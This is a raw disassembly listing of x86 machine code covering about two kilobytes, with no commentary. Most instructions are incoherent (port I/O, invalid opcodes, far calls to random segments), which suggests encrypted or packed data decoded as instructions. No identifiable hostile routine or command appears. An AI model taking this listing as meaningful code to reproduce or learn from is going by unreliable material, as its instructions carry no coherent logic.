  40864b:	adc    ecx,DWORD PTR [ebx-0x2d]
  40864e:	ss ds mov ebp,ss
  408652:	in     eax,0xe2
  408654:	mov    esi,0xae3f3404
  408659:	xchg   ebx,eax
  40865a:	mov    cl,0x76
  40865c:	sbb    eax,0x79f31aa3
  408661:	cmp    ebp,edx
  408663:	pop    edi
  408664:	mov    ebx,0x615e2861
  408669:	xor    DWORD PTR [esp+edi*4+0x13bf1991],eax
  408670:	sub    ah,al
  408672:	xchg   ecx,ecx
  408674:	stos   DWORD PTR es:[edi],eax
  408675:	stos   DWORD PTR es:[edi],eax
  408676:	sub    eax,0x5e33c596
  40867b:	cld    
  40867c:	adc    al,0x20
  40867e:	jb     0x408679
  408680:	xor    eax,0xce734ff4
  408685:	sub    cl,ch
  408687:	fwait
  408688:	xchg   esp,eax
  408689:	ret    
  40868a:	js     0x408706
  40868c:	stos   DWORD PTR es:[edi],eax
  40868d:	push   ds
  40868e:	gs repz (bad) 
  408691:	div    dh
  408693:	pop    si
  408695:	int    0x6f
  408697:	fxch   st(7)
  408699:	adc    eax,esi
  40869b:	jno    0x408676
  40869d:	repz jnp 0x408718
  4086a0:	add    BYTE PTR [edx+edx*2],dl
  4086a3:	xchg   DWORD PTR [ebx+0x6a],esp
  4086a6:	cmp    BYTE PTR [edi],ch
  4086a8:	hlt    
  4086a9:	mov    ebx,0x1878b0ba
  4086ae:	pop    ecx
  4086af:	lods   al,BYTE PTR ds:[esi]
  4086b0:	(bad)  
  4086b1:	outs   dx,BYTE PTR ds:[esi]
  4086b2:	jp     0x408639
  4086b4:	cld    
  4086b5:	(bad)  
  4086b6:	test   eax,0xc6acae95
  4086bb:	push   edi
  4086bc:	addr16 nop
  4086be:	or     cl,ch
  4086c0:	lds    ecx,FWORD PTR [ebx+0x7df1b608]
  4086c6:	or     eax,edi
  4086c8:	cmc    
  4086c9:	inc    ebx
  4086ca:	loope  0x408732
  4086cc:	cmp    DWORD PTR [edi-0x3d47cb55],0xe33e0970
  4086d6:	enter  0xe403,0x2e
  4086da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4086db:	inc    dh
  4086dd:	nop
  4086de:	mov    dh,0x3c
  4086e0:	inc    ecx
  4086e1:	add    al,0xd7
  4086e3:	pushf  
  4086e4:	aam    0x63
  4086e6:	sbb    BYTE PTR [ecx-0xf],ah
  4086e9:	dec    edi
  4086ea:	push   cs
  4086eb:	sbb    eax,0xe66b8fd3
  4086f0:	rol    BYTE PTR [ebp+eax*4+0x4607af40],0xd
  4086f8:	(bad)  
  4086fa:	xor    al,ah
  4086fc:	ss inc ebp
  4086fe:	fist   WORD PTR [esi-0xe78e307]
  408704:	out    dx,eax
  408705:	mov    ebx,0x34d12b0e
  40870a:	rcl    cl,0x5c
  40870d:	adc    ebx,DWORD PTR [edx-0x3b099292]
  408713:	retf   0x2e84
  408716:	push   cs
  408717:	inc    esp
  408718:	add    DWORD PTR [edx],esi
  40871a:	add    bh,BYTE PTR [esi]
  40871c:	inc    ebx
  40871d:	dec    edx
  40871e:	cmp    eax,0xc9b2395
  408723:	jmp    FWORD PTR [edx]
  408725:	sti    
  408726:	aas    
  408727:	mov    ebx,0xc68b7a69
  40872c:	xor    edx,eax
  40872e:	sbb    eax,ebx
  408730:	stos   BYTE PTR es:[edi],al
  408731:	rcl    BYTE PTR [esi+0x20a334f9],1
  408737:	cdq    
  408738:	stos   BYTE PTR es:[edi],al
  408739:	ficomp DWORD PTR [ecx]
  40873b:	xchg   DWORD PTR [eax],ebp
  40873d:	cdq    
  40873e:	test   BYTE PTR [edx+0xd8aa2],ch
  408744:	ret    0x805c
  408747:	mov    ecx,0x2bc5f18c
  40874c:	shl    BYTE PTR [edx-0xe0b9e35],cl
  408752:	lahf   
  408753:	es cmp eax,0xe9ae45c6
  408759:	inc    edi
  40875a:	(bad)  
  40875b:	mov    ch,0x1c
  40875d:	jg     0x408705
  40875f:	mov    ebp,0xe99983e9
  408764:	sbb    DWORD PTR [esi-0xb],ebx
  408767:	int3   
  408768:	or     dh,BYTE PTR [eax]
  40876a:	dec    ebp
  40876b:	sbb    eax,0xb1f67968
  408770:	mov    dl,0x70
  408772:	std    
  408773:	mov    ebx,0x55e81736
  408778:	inc    ebp
  408779:	xor    dh,cl
  40877b:	or     ebp,DWORD PTR ds:0xed58c34b
  408781:	jno    0x40879b
  408783:	enter  0x2ed3,0x1e
  408787:	pop    ds
  408788:	dec    eax
  408789:	inc    ecx
  40878a:	cmp    eax,0x2795e004
  40878f:	jmp    0x22d51b0a
  408794:	lds    edi,FWORD PTR [edx]
  408796:	push   esi
  408797:	xor    DWORD PTR [edi],0xffffff99
  40879a:	jle    0x4087a1
  40879c:	inc    esp
  40879d:	fdivr  QWORD PTR [eax+0x58]
  4087a0:	pusha  
  4087a1:	(bad)  
  4087a2:	sbb    DWORD PTR [ebx-0x64df68e3],esp
  4087a8:	mov    esi,0x1d00544f
  4087ad:	push   es
  4087ae:	sahf   
  4087af:	sti    
  4087b0:	mul    DWORD PTR [ecx+ebp*1]
  4087b3:	add    eax,0xb51d2f72
  4087b8:	or     esp,ecx
  4087ba:	cmp    bh,bl
  4087bc:	pusha  
  4087bd:	pusha  
  4087be:	jle    0x4087aa
  4087c0:	mov    ah,0x61
  4087c2:	adc    ch,BYTE PTR [esi+0x196f334f]
  4087c8:	enter  0x5aa7,0x7a
  4087cc:	popa   
  4087cd:	pop    ds
  4087ce:	ja     0x4087a8
  4087d0:	shr    DWORD PTR [esi-0x200b4868],1
  4087d6:	cld    
  4087d7:	ja     0x4087e2
  4087d9:	lahf   
  4087da:	xor    ecx,esp
  4087dc:	sbb    DWORD PTR [eax],eax
  4087de:	xor    DWORD PTR [ebx+0x2],eax
  4087e1:	test   DWORD PTR [ebp+0xa],esi
  4087e4:	add    eax,0xe2590f59
  4087e9:	div    BYTE PTR [esi-0xc]
  4087ec:	xchg   esp,eax
  4087ed:	jle    0x408806
  4087ef:	mov    eax,0x99ca8626
  4087f4:	and    DWORD PTR [edi+edx*2-0x2b],0x41c772a5
  4087fc:	or     eax,DWORD PTR [edx+0x4d4eee1e]
  408802:	aaa    
  408803:	(bad)  
  408804:	call   0xb2d36642
  408809:	les    esp,FWORD PTR ds:0xb7e55349
  40880f:	shr    ah,cl
  408811:	inc    edx
  408812:	mov    DWORD PTR [eax+0x37e57fb8],edi
  408818:	(bad)  
  408819:	jge    0x408870
  40881b:	retf   
  40881c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40881d:	pop    edi
  40881e:	jge    0x408848
  408820:	jp     0x4087c5
  408822:	xchg   BYTE PTR [ecx],al
  408824:	lods   eax,DWORD PTR ds:[esi]
  408825:	retf   
  408826:	call   0xd092b54b
  40882b:	pop    es
  40882c:	ins    BYTE PTR es:[edi],dx
  40882d:	outs   dx,BYTE PTR ds:[esi]
  40882e:	jle    0x40884a
  408830:	lock ds mov esp,0x6f0936ce
  408837:	std    
  408838:	or     ecx,0x3bf9e12c
  40883e:	iret   
  40883f:	mov    esp,edi
  408841:	icebp  
  408842:	daa    
  408843:	inc    ebx
  408844:	pop    edx
  408845:	popf   
  408846:	ins    BYTE PTR es:[edi],dx
  408847:	xchg   edi,eax
  408848:	xor    ebx,DWORD PTR [ebx]
  40884a:	xchg   bh,ch
  40884c:	push   eax
  40884d:	pop    ecx
  40884e:	pop    ebp
  40884f:	pop    esi
  408850:	add    DWORD PTR [ebx+0x63],edi
  408853:	adc    cl,ch
  408855:	push   ss
  408856:	lahf   
  408857:	inc    eax
  408858:	inc    ebp
  408859:	or     BYTE PTR [ebx-0x5c9b3824],dl
  40885f:	and    al,0x9
  408861:	mov    ebp,0x4aa89da1
  408866:	mov    eax,0x83ce6566
  40886b:	inc    ebp
  40886c:	mov    ecx,0x45016364
  408871:	fwait
  408872:	call   0x424a:0xfaf1654
  408879:	shr    DWORD PTR [edi+ecx*8+0x6f8190d4],0x5a
  408881:	mov    dh,BYTE PTR [esi-0x4c]
  408884:	out    dx,eax
  408885:	push   es
  408886:	outs   dx,BYTE PTR ds:[esi]
  408887:	cdq    
  408888:	mov    edx,0x82110ea3
  40888d:	sub    eax,0xf9b8bdd2
  408892:	repz inc ebx
  408894:	jne    0x408910
  408896:	out    dx,al
  408897:	aad    0xec
  408899:	mov    ds:0x7950b3d0,al
  40889e:	mov    ebx,es
  4088a0:	push   esp
  4088a1:	out    dx,al
  4088a2:	dec    esi
  4088a3:	pop    esp
  4088a4:	push   0x3e
  4088a6:	out    dx,al
  4088a7:	loop   0x4088fd
  4088a9:	lods   eax,DWORD PTR ds:[esi]
  4088aa:	int3   
  4088ab:	mov    cl,0x8e
  4088ad:	retf   0xfbf4
  4088b0:	pop    ss
  4088b1:	xchg   ecx,eax
  4088b2:	xor    eax,0x969ddfbc
  4088b7:	mov    BYTE PTR [eax-0x1b6158ea],al
  4088bd:	jmp    0x408852
  4088bf:	call   0x8e9b:0x66b3031a
  4088c6:	enter  0xa80a,0x52
  4088ca:	outs   dx,BYTE PTR ds:[esi]
  4088cb:	push   eax
  4088cc:	sub    ecx,DWORD PTR [esi+0x3e]
  4088cf:	add    al,0xf9
  4088d1:	mov    edi,0xc25ed598
  4088d6:	fbstp  TBYTE PTR [eax]
  4088d8:	jp     0x4088c7
  4088da:	(bad)  
  4088db:	lds    edi,FWORD PTR [ebx*4-0x683f3ae9]
  4088e2:	inc    edi
  4088e3:	out    dx,eax
  4088e4:	sti    
  4088e5:	outs   dx,DWORD PTR ds:[esi]
  4088e6:	and    ebp,DWORD PTR [edi+edx*4]
  4088e9:	mov    ebp,0x783c5021
  4088ee:	xor    al,0x19
  4088f0:	fild   WORD PTR [ebx+0x5316feed]
  4088f6:	je     0x40887e
  4088f8:	adc    al,0xc2
  4088fa:	or     edx,0x38
  4088fd:	shl    BYTE PTR [edi+0x1640cd6b],0x48
  408904:	(bad)  
  408905:	xchg   edx,eax
  408906:	or     esi,ebx
  408908:	push   0xffffffaf
  40890a:	jmp    0x4088ce
  40890c:	and    cl,dl
  40890e:	sbb    al,BYTE PTR [ebx-0x47]
  408911:	push   es
  408912:	push   ebp
  408913:	sub    cl,0x4b
  408916:	std    
  408917:	xchg   ebp,eax
  408918:	jo     0x408916
  40891a:	cmc    
  40891b:	or     BYTE PTR [esi+0x63b6b3a8],cl
  408921:	pusha  
  408922:	mov    BYTE PTR [edx+ebx*4],0xf8
  408926:	or     dl,dl
  408928:	imul   esi,DWORD PTR ds:0x96988333,0x14
  40892f:	push   ss
  408930:	pop    ebp
  408931:	pop    ebp
  408932:	dec    ebx
  408933:	retf   0x3fb3
  408936:	push   ebp
  408937:	clc    
  408938:	add    al,0x54
  40893a:	sahf   
  40893b:	dec    ecx
  40893c:	xchg   ebp,eax
  40893d:	lods   ax,WORD PTR ds:[esi]
  40893f:	pusha  
  408940:	and    al,0xe3
  408942:	jb     0x40896c
  408944:	cmp    DWORD PTR [esi],ebx
  408946:	pop    ebp
  408947:	add    edx,esi
  408949:	jbe    0x40896f
  40894b:	lea    edi,[edi]
  40894d:	jnp    0x408956
  40894f:	jecxz  0x408993
  408951:	add    eax,DWORD PTR [esi]
  408953:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408954:	ret    0x61f0
  408957:	test   eax,0xe23e441c
  40895c:	add    dh,BYTE PTR [ecx]
  40895e:	cmc    
  40895f:	int3   
  408960:	mov    eax,0xdaaedcc2
  408965:	outs   dx,BYTE PTR ds:[esi]
  408966:	sbb    DWORD PTR [eax],0x1e35fb5b
  40896c:	fwait
  40896d:	inc    eax
  40896e:	cmp    DWORD PTR [edi-0x7f],0x4ac6985a
  408975:	and    dl,bh
  408977:	mul    DWORD PTR [eax+0x5889311e]
  40897d:	dec    edi
  40897e:	pop    ebp
  40897f:	sbb    eax,0xec3f4194
  408984:	add    DWORD PTR [eax+ecx*1],0x8cca85ee
  40898b:	jno    0x4089da
  40898d:	and    ebx,ebx
  40898f:	ds cdq 
  408991:	call   0xce4c:0xe4f89856
  408998:	sub    bh,BYTE PTR [esi-0x46fd0dfc]
  40899e:	int3   
  40899f:	out    0xd1,eax
  4089a1:	xchg   ebp,eax
  4089a2:	loop   0x40896d
  4089a4:	sbb    ebp,edi
  4089a6:	dec    ebp
  4089a7:	mov    ch,bl
  4089a9:	mov    ecx,0xd4162b27
  4089ae:	imul   ebx,DWORD PTR [edx+0x5e6d5c77],0x2a4a800a
  4089b8:	bound  esi,QWORD PTR [ebx-0x5fbc9f58]
  4089be:	mov    ch,0xbd
  4089c0:	(bad)  
  4089c1:	outs   dx,DWORD PTR ds:[esi]
  4089c2:	cmp    DWORD PTR [edx+0x2fdb33c5],0xffffff90
  4089c9:	xchg   DWORD PTR [edx-0x434c8cb8],ebp
  4089cf:	loope  0x408a09
  4089d1:	push   ebp
  4089d2:	mov    ebp,0xa22e631e
  4089d7:	fsubr  st,st(3)
  4089d9:	sbb    bh,BYTE PTR [edi+0x1e7e23da]
  4089df:	sbb    al,BYTE PTR [ebp-0x466e4974]
  4089e5:	mov    ch,0x24
  4089e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4089e8:	dec    edi
  4089e9:	repz add BYTE PTR [edx+0x2e],ah
  4089ed:	pushf  
  4089ee:	sbb    eax,0x770e52cc
  4089f3:	rol    DWORD PTR [ecx+0x37],cl
  4089f6:	mov    esp,0xc85bf608
  4089fb:	inc    eax
  4089fc:	mov    cl,0xcf
  4089fe:	retf   
  4089ff:	cdq    
  408a00:	jge    0x408a21
  408a02:	mov    esi,0x6bc949cb
  408a07:	pop    ss
  408a08:	rol    DWORD PTR [ebx+eax*1-0x5219d16e],1
  408a0f:	call   0x6fb5:0x61e7ea63
  408a16:	xor    edx,DWORD PTR ss:[edx]
  408a19:	sti    
  408a1a:	dec    esp
  408a1b:	call   0x7315:0x70dad388
  408a22:	sub    eax,0x78977700
  408a27:	jge    0x408a00
  408a29:	sub    ebp,DWORD PTR [edx+eax*4]
  408a2c:	or     al,ah
  408a2e:	inc    edi
  408a2f:	cdq    
  408a30:	rcl    DWORD PTR [ecx+esi*4+0x1],1
  408a34:	inc    edi
  408a35:	sbb    ebx,ecx
  408a37:	add    ebp,DWORD PTR [ebp+edx*4-0xd]
  408a3b:	shl    BYTE PTR [esi-0x226a5621],0x30
  408a42:	ss je  0x408a29
  408a45:	mov    cl,0x57
  408a47:	jnp    0x408ab1
  408a49:	sbb    ebx,edi
  408a4b:	(bad)  
  408a4c:	dec    esi
  408a4d:	mov    ecx,0x885a4dcb
  408a52:	push   0xffffff9d
  408a54:	imul   edi,DWORD PTR [ebx-0x5b],0xffffffaf
  408a58:	fimul  DWORD PTR [ebx+0x5caac749]
  408a5e:	xor    al,0x34
  408a60:	rol    esp,1
  408a62:	mov    bl,0xb2
  408a64:	(bad)  
  408a65:	cld    
  408a66:	in     al,dx
  408a67:	inc    ebp
  408a68:	fmul   DWORD PTR [ebx]
  408a6a:	sbb    eax,0xed8cbebe
  408a6f:	or     bh,BYTE PTR [eax]
  408a71:	push   esp
  408a72:	(bad)  
  408a73:	sbb    BYTE PTR [edi-0x5c],bl
  408a76:	mov    esi,0x8469db
  408a7b:	dec    esp
  408a7c:	mov    al,ds:0x360013af
  408a81:	dec    eax
  408a83:	loop   0x408a8f
  408a85:	and    eax,DWORD PTR [ebx]
  408a87:	ja     0x408acc
  408a89:	shl    BYTE PTR ds:0xa3ba9d93,0xad
  408a90:	mov    edi,DWORD PTR [esi-0x4e]
  408a93:	dec    esi
  408a94:	mov    ecx,0xfed34282
  408a99:	std    
  408a9a:	push   edi
  408a9b:	pop    ebp
  408a9c:	out    dx,al
  408a9d:	mov    edx,DWORD PTR [edx+0x6f]
  408aa0:	cmp    esi,esp
  408aa2:	mov    edx,0x517e2d66
  408aa7:	(bad)  
  408aa9:	or     DWORD PTR [esi+0x74cfbdb6],esp
  408aaf:	or     ch,BYTE PTR [edi-0x5f]
  408ab2:	in     al,dx
  408ab3:	push   ds
  408ab4:	and    ecx,ebp
  408ab6:	or     BYTE PTR [edi],ah
  408ab8:	mov    bh,0xa9
  408aba:	enter  0xbc45,0x24
  408abe:	addr16 jo 0x408b3d
  408ac1:	ss inc ebp
  408ac3:	in     eax,0xd4
  408ac5:	mov    WORD PTR [ebp+0x2f],ss
  408ac8:	ror    DWORD PTR [esi-0x42],0xd1
  408acc:	call   0xfce3854c
  408ad1:	jge    0x408a95
  408ad3:	sub    DWORD PTR [edx+0x4d9cc8f8],edx
  408ad9:	mov    edi,0x497b2f9
  408ade:	jo     0x408aac
  408ae0:	jo     0x408a75
  408ae2:	into   
  408ae3:	imul   ebp,DWORD PTR [eax+eax*4+0xc],0xffffffa9
  408ae8:	retf   0xd1fb
  408aeb:	dec    ecx
  408aec:	retf   
  408aed:	aam    0x9f
  408aef:	call   0xef97e952
  408af4:	sar    BYTE PTR [ecx+eiz*4-0x37],cl
  408af8:	les    ebx,FWORD PTR [edi+0x41c4541c]
  408afe:	mov    ds:0x5545a5be,al
  408b03:	(bad)  
  408b04:	pop    ebx
  408b05:	dec    ebx
  408b06:	lfs    edx,FWORD PTR [ebx-0x4b]
  408b0a:	mov    dh,0xd2
  408b0c:	pop    ss
  408b0d:	loopne 0x408b6f
  408b0f:	mov    ds:0x4d0413af,eax
  408b14:	push   edi
  408b15:	push   edx
  408b16:	addr16 mov ah,0xe2
  408b19:	lock or cl,BYTE PTR ds:0x698765b5
  408b20:	push   cs
  408b21:	inc    ecx
  408b22:	in     eax,dx
  408b23:	shl    cl,1
  408b25:	jl     0x408b0d
  408b27:	and    DWORD PTR [ecx-0x5f],ebp
  408b2a:	test   eax,0xd0fa31bd
  408b2f:	(bad)  
  408b30:	repz mov edx,0x2890cbd8
  408b36:	sub    eax,0x45a5d642
  408b3b:	mov    esp,0xb989ce5a
  408b40:	and    esp,esp
  408b42:	out    0x73,eax
  408b44:	mov    dl,0x23
  408b46:	adc    BYTE PTR [ecx+esi*1+0x69],ch
  408b4a:	cmp    eax,ebx
  408b4c:	icebp  
  408b4d:	in     eax,dx
  408b4e:	ins    BYTE PTR es:[edi],dx
  408b4f:	cmc    
  408b50:	inc    ebx
  408b51:	fucom  st(7)
  408b53:	sahf   
  408b54:	retf   0x5c5a
  408b57:	pushw  es
  408b59:	xchg   esi,eax
  408b5a:	cmp    al,0xdf
  408b5c:	ds push edx
  408b5e:	clc    
  408b5f:	ja     0x408ae8
  408b61:	push   ss
  408b62:	int3   
  408b63:	inc    ecx
  408b64:	fnsave [edx+0x767f3d05]
  408b6a:	sti    
  408b6b:	sahf   
  408b6c:	pop    edx
  408b6d:	push   eax
  408b6e:	xchg   ebx,eax
  408b6f:	sbb    BYTE PTR [ebp+0x5cc51577],0x14
  408b76:	sub    al,0x49
  408b78:	shl    DWORD PTR [ecx],1
  408b7a:	sbb    ebx,eax
  408b7c:	xchg   edx,eax
  408b7d:	add    BYTE PTR [edi-0x79],bl
  408b80:	sti    
  408b81:	mov    ah,0x21
  408b83:	add    BYTE PTR [ecx+0x7f],0x28
  408b87:	add    dh,BYTE PTR [ecx+ebx*8-0x3c]
  408b8b:	ret    0xa090
  408b8e:	hlt    
  408b8f:	add    eax,0xc28c29a7
  408b94:	jg     0x408b35
  408b96:	clc    
  408b97:	cli    
  408b98:	arpl   WORD PTR [eax],sp
  408b9a:	mov    ebx,0x7ab42f34
  408b9f:	mov    al,ds:0x6ea159fb
  408ba4:	dec    esp
  408ba5:	pop    eax
  408ba6:	fisttp WORD PTR [bp+di+0x1be5]
  408bab:	add    BYTE PTR [ecx],dl
  408bad:	inc    eax
  408bae:	fdiv   st(3),st
  408bb0:	cmp    al,0xbf
  408bb2:	or     eax,0x92d2f76c
  408bb7:	mov    eax,ds:0x8c1203ee
  408bbc:	or     esp,edx
  408bbe:	scas   al,BYTE PTR es:[edi]
  408bbf:	mov    edx,eax
  408bc1:	in     eax,0x7
  408bc3:	xchg   esi,eax
  408bc4:	bound  edx,QWORD PTR [ecx-0x5a]
  408bc7:	stc    
  408bc8:	retf   
  408bc9:	mov    eax,0x165fd167
  408bce:	jns    0x408c27
  408bd0:	imul   ecx,eax,0x2d
  408bd3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408bd4:	pop    ecx
  408bd5:	mov    eax,ds:0xf1a4f078
  408bda:	add    BYTE PTR [ebx],bh
  408bdc:	mov    eax,0x4ed49a7f
  408be1:	ins    DWORD PTR es:[edi],dx
  408be2:	std    
  408be3:	push   esp
  408be4:	xchg   ecx,eax
  408be5:	dec    edx
  408be6:	dec    eax
  408be7:	pusha  
  408be8:	or     ecx,DWORD PTR [ecx+0x3093f48b]
  408bee:	adc    eax,0xac49ec3
  408bf3:	lahf   
  408bf4:	int3   
  408bf5:	pop    eax
  408bf6:	ds push ds
  408bf8:	sub    BYTE PTR [ebp-0x30386e29],0x81
  408bff:	mov    ecx,0xeac089
  408c04:	sbb    al,0x98
  408c06:	(bad)  
  408c07:	fsub   DWORD PTR [edi+0x67c5b1fc]
  408c0d:	fs jmp 0xb33c1169
  408c13:	mov    ds:0xe297d544,eax
  408c18:	inc    eax
  408c19:	(bad)  
  408c1a:	in     al,0xf5
  408c1c:	mov    esp,0xe8c23182
  408c21:	sbb    al,0x1
  408c23:	cmp    al,0x50
  408c25:	psrlq  mm2,QWORD PTR [ecx]
  408c28:	push   esi
  408c29:	inc    esi
  408c2a:	outs   dx,DWORD PTR ds:[esi]
  408c2b:	outs   dx,DWORD PTR ds:[esi]
  408c2c:	ins    BYTE PTR es:[edi],dx
  408c2d:	aad    0xe1
  408c2f:	stos   DWORD PTR es:[edi],eax
  408c30:	inc    eax
  408c31:	ja     0x408c21
  408c33:	pop    esp
  408c34:	pop    edi
  408c35:	loop   0x408c72
  408c37:	pop    ds
  408c38:	inc    ebx
  408c39:	ror    DWORD PTR [esp+edi*8-0x33cf6ae],0xe
  408c41:	enter  0x4215,0x84
  408c45:	jp     0x408c46
  408c47:	push   ecx
  408c48:	sub    BYTE PTR [edi+0x2b5cfb8f],ch
  408c4e:	rol    DWORD PTR [eax+0x77],1
  408c51:	or     BYTE PTR [ecx+edi*4+0x17],dl
  408c55:	adc    DWORD PTR [ebx+0x61],edi
  408c58:	ds cs pushf 
  408c5b:	add    edi,DWORD PTR [edi]
  408c5d:	scas   eax,DWORD PTR es:[edi]
  408c5e:	inc    ebx
  408c5f:	pop    ds
  408c60:	arpl   di,dx
  408c62:	out    dx,eax
  408c63:	adc    DWORD PTR [ecx],esp
  408c65:	jecxz  0x408bfb
  408c67:	and    BYTE PTR [esi+0x7],cl
  408c6a:	gs inc esp
  408c6c:	lahf   
  408c6d:	xor    BYTE PTR [ebp+0x53],ah
  408c70:	dec    ecx
  408c71:	or     BYTE PTR [ecx-0x7d],al
  408c74:	test   DWORD PTR [eax+0x4e57d30d],edi
  408c7a:	lods   eax,DWORD PTR ds:[esi]
  408c7b:	adc    eax,0x60f5d179
  408c80:	call   0x6115:0x4346b0c3
  408c87:	mov    bh,0x19
  408c89:	stc    
  408c8a:	jne    0x408ca4
  408c8c:	mov    al,BYTE PTR [edx+0x5a]
  408c8f:	xchg   DWORD PTR [esi+0x3e],edx
  408c92:	jecxz  0x408ca1
  408c94:	(bad)  ds:0xfe63089c
  408c9a:	cmp    BYTE PTR [edi],bl
  408c9c:	shr    DWORD PTR [ecx+edx*8],cl
  408c9f:	sub    bh,BYTE PTR [ebx]
  408ca1:	fst    st(0)
  408ca3:	or     bl,bh
  408ca5:	dec    edi
  408ca6:	xchg   DWORD PTR [ebx-0x3715a9c5],esp
  408cac:	mov    eax,ds:0xd37a02f8
  408cb1:	cli    
  408cb2:	pop    ebx
  408cb3:	lahf   
  408cb4:	bound  edi,QWORD PTR [edi+0x4d]
  408cb7:	clc    
  408cb8:	or     eax,0x5f16be5e
  408cbd:	mov    eax,ds:0xb607daa3
  408cc2:	iret   
  408cc3:	shr    al,0xdc
  408cc6:	mov    edx,0xcff01132
  408ccb:	sub    DWORD PTR [eax+0x282ee3b7],0xffffffc1
  408cd2:	dec    esp
  408cd3:	into   
  408cd4:	jae    0x408cc1
  408cd6:	int    0xc4
  408cd8:	dec    esp
  408cd9:	jae    0x408cdb
  408cdb:	inc    ecx
  408cdc:	ficomp DWORD PTR [edx+0x64ed8380]
  408ce2:	mov    ds:0x9c36a072,eax
  408ce7:	sub    dl,ah
  408ce9:	stos   DWORD PTR es:[edi],eax
  408cea:	and    ah,BYTE PTR [ecx]
  408cec:	mov    eax,0x5a0731ab
  408cf1:	cdq    
  408cf2:	mov    WORD PTR [ebx+0x2b33d930],ss
  408cf8:	icebp  
  408cf9:	jp     0x408c80
  408cfb:	in     al,dx
  408cfc:	mov    ebp,0x99c55ba3
  408d01:	sub    BYTE PTR [edi-0xae9ec65],cl
  408d07:	fstp   QWORD PTR [ebx]
  408d09:	mov    ebp,0xb99c13e1
  408d0e:	shr    BYTE PTR [esi-0x7c5f2ef7],0x16
  408d15:	push   ebp
  408d16:	pop    ecx
  408d17:	xchg   BYTE PTR [edx],cl
  408d19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408d1a:	es stos BYTE PTR es:[edi],al
  408d1c:	jnp    0x408cab
  408d1e:	sub    eax,0x13b361ba
  408d23:	sbb    DWORD PTR [eax-0x2a8a78dd],esp
  408d29:	and    ch,BYTE PTR [eax]
  408d2b:	push   ebp
  408d2c:	adc    eax,0x1056bbc0
  408d31:	inc    eax
  408d32:	cmp    BYTE PTR [ebp+edx*8-0x23ea3a24],cl
  408d39:	jge    0x408cbc
  408d3b:	jae    0x408d02
  408d3d:	ffreep st(0)
  408d3f:	xchg   ebx,eax
  408d40:	mov    dh,0x3d
  408d42:	in     eax,dx
  408d43:	pop    cx
  408d45:	icebp  
  408d46:	mov    ?,WORD PTR [ecx+0x7c4eca13]
  408d4c:	pop    eax
  408d4d:	and    DWORD PTR [edx],0xfffffffc
  408d50:	scas   al,BYTE PTR es:[edi]
  408d51:	retf   0x9bf2
  408d54:	daa    
  408d55:	mov    bh,0xdd
  408d57:	jnp    0x408cf2
  408d59:	aad    0xf9
  408d5b:	push   ecx
  408d5c:	into   
  408d5d:	sti    
  408d5e:	or     BYTE PTR [esi],cl
  408d60:	out    0x96,eax
  408d62:	repnz aam 0x34
  408d65:	adc    eax,0xd7c5bba8
  408d6a:	xchg   edx,eax
  408d6b:	xor    ebx,eax
  408d6d:	(bad)  
  408d6e:	sti    
  408d6f:	jo     0x408dce
  408d71:	rol    eax,0x90
  408d74:	fiadd  WORD PTR [ebp+0x18]
  408d77:	and    ah,BYTE PTR [ebp+0x8]
  408d7a:	in     al,dx
  408d7b:	dec    esp
  408d7c:	fisubr DWORD PTR [edx+0x21]
  408d7f:	mov    cl,BYTE PTR [eax-0x41453eb6]
  408d85:	xor    esp,edi
  408d87:	sbb    al,0x82
  408d89:	div    DWORD PTR [esi]
  408d8b:	clc    
  408d8c:	dec    ebp
  408d8d:	cmp    al,0xd2
  408d8f:	ret    
  408d90:	daa    
  408d91:	sub    al,0xe9
  408d93:	ret    
  408d94:	jbe    0x73960a3a
  408d9a:	out    dx,eax
  408d9b:	jmp    0x408da9
  408d9d:	push   esi
  408d9e:	es out dx,eax
  408da0:	xlat   BYTE PTR ds:[ebx]
  408da1:	sbb    DWORD PTR [ebx],ebx
  408da3:	jmp    0xecd03958
  408da8:	mov    DWORD PTR [edi-0x3343a51d],edx
  408dae:	fdiv   QWORD PTR ds:0x2d07c73b
  408db4:	out    dx,eax
  408db5:	or     BYTE PTR [edx-0x78b3d6ab],0x45
  408dbc:	inc    DWORD PTR [ebx-0x18c331cb]
  408dc2:	jmp    0xb31a:0xc407b6ad
  408dc9:	je     0x408e10
  408dcb:	push   edi
  408dcc:	jle    0x408dc9
  408dce:	dec    eax
  408dcf:	(bad)  
  408dd0:	xlat   BYTE PTR ds:[ebx]
  408dd1:	clc    
  408dd2:	xchg   esp,eax
  408dd3:	out    dx,eax
  408dd4:	lods   eax,DWORD PTR ds:[esi]
  408dd5:	je     0x408d7e
  408dd7:	mov    eax,0xd86fe6bb
  408ddc:	nop
  408ddd:	mov    ebp,0x32f4c9a8
  408de2:	cmp    edx,esp
  408de4:	xchg   esp,eax
  408de5:	inc    ebx
  408de6:	sbb    DWORD PTR [ebx],edx
  408de8:	jmp    0x9add1ff1
  408ded:	daa    
  408dee:	push   esi
  408def:	inc    edx
  408df0:	sub    DWORD PTR [ecx+0x29d9ee53],ebx
  408df6:	mov    edi,0x98ae21c3
  408dfb:	cmp    BYTE PTR [edx+0x22],0x39
  408dff:	mov    edx,0x9983e2f4
  408e04:	daa    
  408e05:	mov    esp,0x7e021d46
  408e0a:	leave  
  408e0b:	cmp    ah,dh
  408e0d:	test   al,0xb2
  408e0f:	pop    esi
  408e10:	jbe    0x408de0
  408e12:	or     DWORD PTR [edx],esp
  408e14:	mov    esi,0x2d4d8579
  408e19:	ret    0x2edb
  408e1c:	push   0x76
  408e1e:	sub    al,BYTE PTR [bx+si]
  408e21:	push   0xc78f6747
  408e26:	inc    edx
  408e27:	mov    dh,0xc6
  408e29:	(bad)  
  408e2a:	loope  0x408e6a
  408e2c:	cmp    DWORD PTR [ebp-0x5c],ecx
  408e2f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408e30:	pop    ebx
  408e31:	xor    edi,DWORD PTR [esi]
  408e33:	add    DWORD PTR ds:[ebp+0x47],esp
  408e37:	pop    eax
  408e38:	push   es
  408e39:	(bad)  
  408e3a:	repnz stc 
  408e3c:	jnp    0x408e97
  408e3e:	out    0x78,al
  408e40:	jmp    0x6b5e6615
  408e45:	pop    ds
  408e46:	nop
  408e47:	in     eax,dx
  408e48:	jl     0x408ddc
